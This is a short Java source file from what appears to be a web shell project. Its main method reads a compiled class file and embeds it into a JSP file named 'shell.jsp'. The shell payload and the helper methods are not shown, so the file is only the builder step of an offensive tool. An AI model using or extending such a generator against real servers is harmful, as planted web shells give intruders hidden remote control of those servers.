import java.io.*;

/***
 * create jsp
 */

public class Main {
   static  String   classfile = "/Users/zxmoa/Documents/git/webshell/out/production/webshell/Ch.class";
   static  String  jspfile = "shell.jsp";

    public static void main(String[] args) {

        try {
             //ch.class位置
             String classDate =  Tools.loadClassData(classfile);
             //jsp 位置
             Tools.hanldleJsp(new File(jspfile), classDate);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
